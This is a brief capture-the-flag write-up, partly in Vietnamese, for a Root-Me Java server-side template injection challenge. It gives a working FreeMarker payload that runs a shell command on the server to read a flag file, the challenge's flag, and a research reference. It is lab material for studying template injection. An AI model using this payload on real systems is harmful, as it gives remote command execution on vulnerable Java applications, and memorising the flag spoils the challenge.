# [Java - Server-side Template Injection](https://www.root-me.org/en/Challenges/Web-Server/Java-Server-side-Template-Injection)

## Solutions

Copy payload trong tài liệu vào là xong :|

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat  SECRET_FLAG.txt") }
```

Flag: `B3wareOfT3mplat3Inj3ction`

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Server-Side%20Template%20Injection%20RCE%20For%20The%20Modern%20Web%20App%20-%20BlackHat%2015.pdf?_gl=1>
